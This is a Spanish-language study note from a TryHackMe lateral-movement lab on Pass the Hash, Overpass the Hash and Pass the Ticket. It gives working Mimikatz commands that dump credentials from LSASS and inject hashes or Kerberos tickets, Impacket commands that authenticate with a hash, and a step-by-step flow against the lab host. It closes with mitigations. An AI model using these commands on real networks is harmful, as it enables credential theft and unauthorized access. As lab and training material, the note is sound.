---
tags: [red-team, lateral-movement, pass-the-hash, pass-the-ticket, kerberos, mimikatz]
created: 2026-04-21
source: TryHackMe - Lateral Movement and Pivoting
related:
  - "[[Spawning Processes Remotely]]"
  - "[[Moving Laterally Using WMI]]"
---

Cuando no tenemos la contraseña en texto plano pero sí el **hash NTLM** o **tickets Kerberos**, podemos autenticarnos igualmente. Estas técnicas son conocidas como **Pass the Hash (PtH)**, **Pass the Ticket (PtT)** y **Overpass the Hash**.

> [!info] MITRE ATT&CK: **T1550 — Use Alternate Authentication Material**

---

## Pass the Hash (PtH)

Usamos directamente el **NTLM hash** del usuario para autenticarnos vía SMB/WinRM/WMI sin conocer la contraseña.

### Con Mimikatz (sekurlsa::pth)

```shell
mimikatz.exe
privilege::debug
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:4ed91524*** /run:powershell.exe
```

> [!tip] Esto abre una nueva sesión de PowerShell con las credenciales "inyectadas". Desde ahí cualquier herramienta que use SSO (PsExec, `dir \\HOST\C$`) se autenticará como ese usuario.

### Con herramientas de Impacket (Linux)

```shell
impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/user@TARGET
```

---

## Overpass the Hash

Convertir un **NTLM hash** en un **ticket Kerberos** (TGT). Útil cuando el entorno solo permite Kerberos y no NTLM.

```shell
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:<hash> /run:powershell.exe
```

Dentro de la shell resultante:

```powershell
klist
# Forzar solicitud de TGT usando el hash inyectado
net use \\THMIIS.za.tryhackme.com
klist
```

---

## Pass the Ticket (PtT)

Si ya tenemos un **TGT** o **TGS** (en formato `.kirbi` o `.ccache`), lo inyectamos en la sesión.

### Extraer tickets

```shell
mimikatz # sekurlsa::tickets /export
```

### Inyectar un ticket

```shell
mimikatz # kerberos::ptt C:\path\to\ticket.kirbi
```

Verificar:

```shell
klist
```

---

## Flujo típico contra THMIIS

1. En el host comprometido, dumpear credenciales con Mimikatz:
   ```shell
   privilege::debug
   sekurlsa::logonpasswords
   ```
2. Copiar el NTLM hash de `t1_toby.beck`.
3. Pass the Hash para abrir una shell como ese usuario:
   ```shell
   sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:<hash> /run:powershell.exe
   ```
4. Desde esa shell, ejecutar `flag.exe` en el desktop del usuario (vía `PsExec`, `wmic`, o acceso a `\\THMIIS\C$\Users\t1_toby.beck\Desktop\flag.exe`).

---

## Comandos Clave

```shell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:USER /domain:DOM /ntlm:HASH /run:powershell.exe
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi

# Impacket (atacante Linux)
impacket-psexec -hashes :HASH DOM/USER@TARGET
impacket-wmiexec -hashes :HASH DOM/USER@TARGET
```

---

## Mitigaciones

> [!warning] Contramedidas clave:
> - **Credential Guard** (protege LSASS)
> - **Protected Users group** (impide cachear NTLM)
> - Deshabilitar NTLM y forzar Kerberos
> - Políticas de **tiered administration** (no loguear admins de dominio en estaciones de trabajo)
